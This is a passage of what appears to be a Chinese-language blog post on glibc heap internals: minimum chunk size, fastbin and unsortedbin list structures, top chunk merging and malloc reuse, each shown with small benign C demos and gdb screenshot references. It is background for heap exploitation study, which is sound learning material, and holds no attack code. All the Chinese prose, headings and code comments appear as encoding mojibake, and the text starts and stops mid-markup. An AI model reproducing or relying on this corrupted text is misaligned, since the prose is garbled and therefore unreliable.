id="2-chunkçš„æœ€ä½å¤§å°"><a href="#2-chunkçš„æœ€ä½å¤§å°" class="headerlink" title="2.chunkçš„æœ€ä½å¤§å°"></a>2.chunkçš„æœ€ä½å¤§å°</h4><ul><li>mallocçš„å †å—å¤§å°åœ¨glibcä¸­ä¼šåŠ ä¸Šå‰ä¸¤ä¸ªæˆå‘˜çš„å¤§å°ï¼ˆ0x10å¤§å°ï¼‰ï¼Œæ‰€ä»¥å½“ä½ åˆ†é…ä¸€ä¸ªå †å†…å­˜æ—¶ï¼Œå †å†…å­˜çš„æœ€å°å¤§å°ä¸€å®šä¸º0x20ï¼ˆ0x10+0x10ï¼‰ã€‚ï¼ˆå³ä½¿mallocæ²¡æœ‰æŒ‡å®šå¤§å°ï¼Œä¹Ÿè¦åˆ†é…fdå’Œbkæˆå‘˜ï¼Œæ‰€ä»¥åŠ èµ·æ¥å°±æ˜¯malloc_chunkç»“æ„ä½“çš„å‰4ä¸ªæˆå‘˜çš„å¤§å°æ€»å’Œï¼‰</li><li><strong>chunkçš„æœ€ä½å¤§å°ä¸€å®šä¸º0x20å¤§å°</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//int size=0x109;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ç”¨å¤„</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);    </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/12/15/%E5%A0%86/image-20201214191901328.png" alt="image-20201214191901328"></p><p><img src="/2020/12/15/%E5%A0%86/image-20201214191928725.png" alt="image-20201214191928725"></p><h3 id="0x10-binsçš„å•å‘é“¾è¡¨ã€åŒå‘é“¾è¡¨å­˜å‚¨ç»“æ„"><a href="#0x10-binsçš„å•å‘é“¾è¡¨ã€åŒå‘é“¾è¡¨å­˜å‚¨ç»“æ„" class="headerlink" title="0x10 binsçš„å•å‘é“¾è¡¨ã€åŒå‘é“¾è¡¨å­˜å‚¨ç»“æ„"></a>0x10 binsçš„å•å‘é“¾è¡¨ã€åŒå‘é“¾è¡¨å­˜å‚¨ç»“æ„</h3><h4 id="1-fastbinsçš„å•å‘é“¾è¡¨å­˜å‚¨ç»“æ„"><a href="#1-fastbinsçš„å•å‘é“¾è¡¨å­˜å‚¨ç»“æ„" class="headerlink" title="1.fastbinsçš„å•å‘é“¾è¡¨å­˜å‚¨ç»“æ„"></a>1.fastbinsçš„å•å‘é“¾è¡¨å­˜å‚¨ç»“æ„</h4><ul><li>fastbinsæ˜¯å•å‘é“¾è¡¨å­˜å‚¨ï¼Œfastbinsä¸­çš„çš„chunkæ˜¯ä¸ä¼šåˆå¹¶çš„ï¼ˆglibcè§„å®šè¿™äº›chunkçš„PREV_INUSEä½æ°¸è¿œä¸º1ï¼‰</li></ul><blockquote><p><strong>å­˜å‚¨ç»“æ„ï¼š</strong></p><ul><li><strong>fastbinsçš„å­˜å‚¨é‡‡ç”¨åè¿›å…ˆå‡ºï¼ˆLIFOï¼‰çš„åŸåˆ™ï¼š</strong>åfreeçš„chunkä¼šè¢«æ·»åŠ åˆ°å…ˆfreeçš„chunkçš„åé¢ï¼›åŒç†ï¼Œé€šè¿‡mallocå–å‡ºchunkæ—¶æ˜¯å…ˆå»å–æœ€æ–°æ”¾è¿›å»çš„</li><li>å› ä¸ºæ˜¯å•é“¾è¡¨ï¼Œfastbinsä¸­çš„æ‰€æœ‰chunkçš„bkæ˜¯æ²¡æœ‰ç”¨åˆ°çš„</li><li>å¹¶ä¸”fastbinsæ¯”è¾ƒç‰¹æ®Šï¼Œä¸€ä¸ªfastbiné“¾ç¬¬ä¸€ä¸ªchunkæŒ‡å‘äºä¸€ä¸ªç‰¹æ®Šçš„â€œ0â€ï¼Œç„¶ååé¢æ¥çš„æ˜¯åfreeçš„chunkâ€¦â€¦ä»¥æ­¤ç±»æ¨ï¼Œæœ€åä¸€ä¸ªchunkå†ç”±arenaçš„malloc_stateçš„fastbinsYæ•°ç»„æ‰€ç®¡ç†</li></ul><p><img src="/2020/12/15/%E5%A0%86/image-20201215160058074.png" alt="image-20201215160058074"></p></blockquote><p><strong>æ¼”ç¤º</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x10</span>;</span><br><span class="line">    <span class="keyword">int</span> size2=<span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">int</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">int</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">int</span> *p3=<span class="built_in">malloc</span>(size2);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//åªä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ï¼Œæ²¡æœ‰å…¶ä»–ä½œç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ‰“åˆ°æ–­ç‚¹å¤„ heapçš„ä¿¡æ¯</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215160443811.png" alt="image-20201215160443811"></p><p>é‡Šæ”¾p1 p2</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215160534048.png" alt="image-20201215160534048"></p><p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªè¢«é‡Šæ”¾chunkçš„fdæŒ‡é’ˆæŒ‡å‘0 è€Œç¬¬äºŒä¸ªè¢«é‡Šæ”¾chunkçš„fdæŒ‡é’ˆæŒ‡å‘ç¬¬ä¸€ä¸ª</p><p>çœ‹ä¸€ä¸‹main_arena å¯ä»¥çœ‹åˆ°æ˜¯æŒ‡å‘æœ€åä¸€ä¸ªchunk ä¹Ÿå°±éªŒè¯äº†ä¸Šé¢çš„ç»“è®º</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215160746395.png" alt="image-20201215160746395"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬é‡Šæ”¾ç¬¬ä¸‰ä¸ª</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215161151487.png" alt="image-20201215161151487"></p><p><img src="/2020/12/15/%E5%A0%86/image-20201215161023500.png" alt="image-20201215161023500"></p><p>ç”±äºä¸å‰ä¸¤ä¸ªå¤§å°ä¸åŒæ‰€ä»¥æˆ‘ä»¬ä¼šæ–°å¼€ä¸€ä¸ªé“¾è¡¨ è¯´æ˜main_arenaçš„åœ°å€ä¹Ÿä¸ä¸€æ ·</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215161240081.png" alt="image-20201215161240081"></p><p>æ­¤æ¬¡æ¼”ç¤ºä¹Ÿå°±å®Œæˆäº†</p><p>32ä½å¯è‡ªè¡Œæ¼”ç¤º</p></blockquote><h4 id="2-unsortedbinçš„åŒå‘é“¾è¡¨å­˜å‚¨ç»“æ„"><a href="#2-unsortedbinçš„åŒå‘é“¾è¡¨å­˜å‚¨ç»“æ„" class="headerlink" title="2.unsortedbinçš„åŒå‘é“¾è¡¨å­˜å‚¨ç»“æ„"></a>2.unsortedbinçš„åŒå‘é“¾è¡¨å­˜å‚¨ç»“æ„</h4><ul><li>freeçš„chunkå¤§å°å¦‚æœå¤§äº0x80ä¼šæ”¾åˆ°unsortedbinä¸Š</li><li>unsortedbinå­˜å‚¨è¿™äº›chunkæ˜¯ä½¿ç”¨åŒå‘å¾ªç¯é“¾è¡¨è¿›è¡Œå­˜å‚¨çš„ï¼ˆ<strong>smallbinsã€largebinsä¹Ÿæ˜¯å¦‚æ­¤ï¼Œæ­¤å¤„åªä»‹ç»unsortedbin</strong>ï¼‰</li></ul><blockquote><p><strong>å­˜å‚¨ç»“æ„</strong>ï¼š</p><ul><li><strong>å­˜å‚¨å¾ªç¯å…ˆå…¥å…ˆå‡ºï¼ˆFIFOï¼‰åŸåˆ™ï¼š</strong>ä¸Šé¢çš„æ˜¯å…ˆfreeæ‰çš„chunkï¼Œä¸‹é¢æ˜¯åfreeæ‰çš„chunkï¼›åŒç†ï¼Œé€šè¿‡mallocå–å‡ºchunkæ—¶æ˜¯å…ˆå–ä¸Šé¢çš„ï¼Œå†å–ä¸‹é¢çš„</li><li><strong>ä¸€ä¸ªbinsä¸­åªæœ‰ä¸€ä¸ªfreechunkæ—¶ï¼š</strong>å°±æ˜¯ä¸‹é¢è¿™ç§è¡¨ç¤ºå½¢å¼ã€‚å¯ä»¥çœ‹åˆ°freechunkçš„fdå’Œbkéƒ½æŒ‡å‘äºbinsçš„fdï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨gdbè°ƒè¯•æ—¶å¯ä»¥ç”¨å‘½ä»¤çœ‹åˆ°ï¼Œå½“biné“¾ä¸­åªæœ‰ä¸€ä¸ªfreechunkæ—¶ï¼Œå…¶fdå’Œbkéƒ½æ˜¯ç›¸åŒçš„ï¼Œéƒ½æŒ‡å‘äºbinsçš„fd</li></ul><p><img src="/2020/12/15/%E5%A0%86/20190729213257204.png" alt="img"></p><ul><li><strong>ä¸€ä¸ªbinsä¸­æœ‰å¤šä¸ªfreechunkæ—¶ï¼š</strong>ä¸Šé¢ä½¿æˆ‘ä»¬çš„struct malloc_stateç»“æ„ä½“ï¼Œç»“æ„ä½“ä¸­çš„binsæ•°ç»„å­˜å‚¨çš„å°±æ˜¯è¿™äº›biné“¾ï¼Œä¸‹é¢å°±æ˜¯binsæ•°ç»„ä¸­å­˜å‚¨unsortedbinçš„ä½ç½®ï¼Œè¿™ä¸ªæ•°ç»„å…ƒç´ å­˜å‚¨çš„å…¶å®å°±æ˜¯ä¸€ä¸ªfdå’Œä¸€ä¸ªbkæŒ‡é’ˆã€‚ä¸‹é¢ç¬¬ä¸€ä¸ªå°±æ˜¯ç¬¬ä¸€ä¸ªfreeæ‰çš„chunkï¼Œå†ä¸‹é¢ä¸€ä¸ªå°±æ˜¯ç¬¬äºŒä¸ªfreeæ‰çš„chunkâ€¦â€¦ä»¥æ­¤ç±»æ¨</li></ul><p><img src="/2020/12/15/%E5%A0%86/20190729212907497.png" alt="img"></p></blockquote><p><strong>æ¼”ç¤º</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x100</span>;</span><br><span class="line">    <span class="keyword">int</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">int</span> *temp=<span class="built_in">malloc</span>(<span class="built_in">size</span>); <span class="comment">//é˜²æ­¢p1ä¸p2åˆå¹¶</span></span><br><span class="line">    <span class="keyword">int</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>);   </span><br><span class="line">    <span class="keyword">int</span> *p3=<span class="built_in">malloc</span>(<span class="built_in">size</span>);   <span class="comment">//é˜²æ­¢p2è¢«top chunkåˆå¹¶</span></span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ‰“æ–­ç‚¹</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215163335296.png" alt="image-20201215163335296"></p><p>é‡Šæ”¾p1</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215163518823.png" alt="image-20201215163518823"></p><p>ä»ä¸Šé¢æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°ä¸‹ä¸€ä¸ªchunkçš„æ ‡å¿—pä½ä¸º0äº†</p><p>çœ‹ä¸‹main_arena</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215163755383.png" alt="image-20201215163755383"></p><p>é‡Šæ”¾p2</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215164417439.png" alt="image-20201215164417439"></p><p>å¯ä»¥çœ‹åˆ°main_arenaæ˜¯å˜äº†çš„</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215165029835.png" alt="image-20201215165029835"></p><p>binså¤´ä¸­fd-&gt;p2 bk-&gt;p1</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215170240262.png" alt="image-20201215170240262"> </p><p>æ¼”ç¤ºå®Œæˆ</p></blockquote><h3 id="0x11-top-chunkçš„å‘å‰åˆå¹¶"><a href="#0x11-top-chunkçš„å‘å‰åˆå¹¶" class="headerlink" title="0x11 top chunkçš„å‘å‰åˆå¹¶"></a>0x11 top chunkçš„å‘å‰åˆå¹¶</h3><h4 id="1-top-chunkæ¦‚å¿µ"><a href="#1-top-chunkæ¦‚å¿µ" class="headerlink" title="1.top chunkæ¦‚å¿µ"></a>1.top chunkæ¦‚å¿µ</h4><ul><li>å½“æˆ‘ä»¬åˆ†é…ä¸€å—å †å†…å­˜æ—¶ï¼Œtop chunkæ˜¯å‡ºäºåœ°å€çš„æœ€é«˜å¤„çš„ï¼Œå…¶å‰é¢å°±æ˜¯æˆ‘ä»¬æ‰€ç”³è¯·çš„chunk</li></ul><h4 id="2-top-chunkçš„åˆå¹¶æ“ä½œ"><a href="#2-top-chunkçš„åˆå¹¶æ“ä½œ" class="headerlink" title="2.top chunkçš„åˆå¹¶æ“ä½œ"></a>2.top chunkçš„åˆå¹¶æ“ä½œ</h4><ul><li>å¦‚æœtop chunkå‰é¢çš„chunkä¸æ˜¯fast chunkå¹¶ä¸”å¤„äºç©ºé—²ï¼Œé‚£ä¹ˆtop chunkå°±ä¼šåˆå¹¶è¿™ä¸ªchunk</li><li>å¦‚æœtop chunkå‰é¢çš„chunkæ˜¯fast chunkï¼Œä¸è®ºæ˜¯å¦ç©ºé—²ï¼Œtop chunkéƒ½ä¸ä¼šåˆå¹¶è¿™ä¸ªchunk</li></ul><h4 id="3-æ¼”ç¤º-1"><a href="#3-æ¼”ç¤º-1" class="headerlink" title="3.æ¼”ç¤º"></a>3.æ¼”ç¤º</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//åªä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ï¼Œæ— å…¶ä»–ä½œç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ–­ç‚¹ å †ä¿¡æ¯</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215194907019.png" alt="image-20201215194907019"></p><p>é‡Šæ”¾p2 å¯ä»¥çœ‹åˆ°p2æ˜¯fastbins æœªè¢«åˆå¹¶</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215194956787.png" alt="image-20201215194956787"></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//åªä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ï¼Œæ— å…¶ä»–ä½œç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ–­ç‚¹</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215195122071.png" alt="image-20201215195122071"></p><p>é‡Šæ”¾p2 å¯ä»¥çœ‹åˆ°p2è¢«åˆå¹¶äº†</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215195147425.png" alt="image-20201215195147425"></p></blockquote><h4 id="4-å¦‚ä½•é˜²æ­¢top-chunkçš„åˆå¹¶"><a href="#4-å¦‚ä½•é˜²æ­¢top-chunkçš„åˆå¹¶" class="headerlink" title="4.å¦‚ä½•é˜²æ­¢top chunkçš„åˆå¹¶"></a>4.å¦‚ä½•é˜²æ­¢top chunkçš„åˆå¹¶</h4><ul><li>åªéœ€è¦åœ¨freeæ‰çš„chunkåé¢ç»§ç»­ç”³è¯·ä¸€ä¸ªchunkï¼Œè¿™æ ·top chunkå°±ä¸ä¼šåˆå¹¶ä¹‹å‰çš„chunk</li></ul><h3 id="0x12-chunkçš„mallocã€free"><a href="#0x12-chunkçš„mallocã€free" class="headerlink" title="0x12 chunkçš„mallocã€free"></a>0x12 chunkçš„mallocã€free</h3><h4 id="1-mallocçš„æœºåˆ¶"><a href="#1-mallocçš„æœºåˆ¶" class="headerlink" title="1.mallocçš„æœºåˆ¶"></a>1.mallocçš„æœºåˆ¶</h4><ul><li><strong>å¦‚æœç¨‹åºæ˜¯ç¬¬ä¸€æ¬¡mallocï¼š</strong>ä¼šåˆ›å»ºä¸€ä¸ªå¾ˆå¤§çš„â€œtop chunkâ€</li><li><strong>å¦‚æœç¨‹åºæ˜¯ç¬¬äºŒæ¬¡åŠä¹‹åmallocï¼š</strong>ä¼šå»å…ˆå‘binsé“¾è¡¨å¯»æ‰¾ç©ºé—´ï¼Œå¦‚æœæ²¡æœ‰å†å»å‘â€œtop chunkâ€è¦ç©ºé—´ï¼›å¦‚æœâ€œtop chunkâ€ä½¿ç”¨å®Œäº†å†é€šè¿‡glibcé‡æ–°ç”³è¯·ä¸€å—æ–°çš„â€œtop chunkâ€</li></ul><h4 id="2-æ¼”ç¤º"><a href="#2-æ¼”ç¤º" class="headerlink" title="2.æ¼”ç¤º"></a>2.æ¼”ç¤º</h4><p>ä¸Šé¢æˆ‘ä»¬å·²ç»æ¼”ç¤ºè¿‡å¾ˆå¤šå›äº† ç¬¬ä¸€æ¬¡å°±ä¸æ¼”ç¤ºäº† è¿™é‡Œä¸»è¦æ¥çœ‹ä¸€ä¸‹ç¬¬äºŒæ¬¡çš„malloc</p><p>è¿™é‡Œæ˜¯æ‹¿fastbinçš„ä¾‹å­</p><h5 id="æ°å¥½åˆ†å‰²ä¸€æ•´å—çš„free-chunkï¼ˆfastbinï¼‰"><a href="#æ°å¥½åˆ†å‰²ä¸€æ•´å—çš„free-chunkï¼ˆfastbinï¼‰" class="headerlink" title="æ°å¥½åˆ†å‰²ä¸€æ•´å—çš„free chunkï¼ˆfastbinï¼‰"></a><strong>æ°å¥½åˆ†å‰²ä¸€æ•´å—çš„free chunkï¼ˆfastbinï¼‰</strong></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//åªä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ï¼Œæ— å…¶ä»–ä½œç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ç›´æ¥çœ‹freeæ‰p1ä¹‹åå¯ä»¥çœ‹åˆ°æ˜¯è¿›å…¥fastbinäº†</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215200256907.png" alt="image-20201215200256907"></p><p><img src="/2020/12/15/%E5%A0%86/image-20201215200306820.png" alt="image-20201215200306820"></p><p>æˆ‘ä»¬åœ¨æ¥ç”³è¯·p2 å¯ä»¥çœ‹è§æ˜¯ç›´æ¥è¦†ç›–äº†p1</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215200355918.png" alt="image-20201215200355918"></p></blockquote><h5 id="åˆ‡å‰²ä¸€å—chunkï¼ˆfastbinï¼‰"><a href="#åˆ‡å‰²ä¸€å—chunkï¼ˆfastbinï¼‰" class="headerlink" title="åˆ‡å‰²ä¸€å—chunkï¼ˆfastbinï¼‰"></a><strong>åˆ‡å‰²ä¸€å—chunkï¼ˆfastbinï¼‰</strong></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);    sleep(<span class="number">0</span>); <span class="comment">//åªä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ï¼Œæ— å…¶ä»–ä½œç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æˆ‘ä»¬ç›´æ¥çœ‹p2åˆ†é…ä¹‹åæŠŠ</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215200826010.png" alt="image-20201215200826010"></p><p>è¿™é‡Œå¯ä»¥çœ‹å‡ºå®ƒå¹¶æœªç”¨fastbinçš„chunk è€Œæ˜¯ä»top chunkåˆ‡å‰²äº†ä¸€éƒ¨åˆ†</p></blockquote><h5 id="æ°å¥½åˆ†å‰²ä¸€æ•´å—çš„free-chunkï¼ˆunsorted-binï¼‰"><a href="#æ°å¥½åˆ†å‰²ä¸€æ•´å—çš„free-chunkï¼ˆunsorted-binï¼‰" class="headerlink" title="æ°å¥½åˆ†å‰²ä¸€æ•´å—çš„free chunkï¼ˆunsorted binï¼‰"></a><strong>æ°å¥½åˆ†å‰²ä¸€æ•´å—çš„free chunkï¼ˆunsorted binï¼‰</strong></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x200</span>;</span><br><span class="line">    <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>); <span class="comment">//ä¸ºäº†è¾¾åˆ°æ¼”ç¤ºæ•ˆæœï¼Œé˜²æ­¢pè¢«top chunkåˆå¹¶</span></span><br><span class="line"> </span><br><span 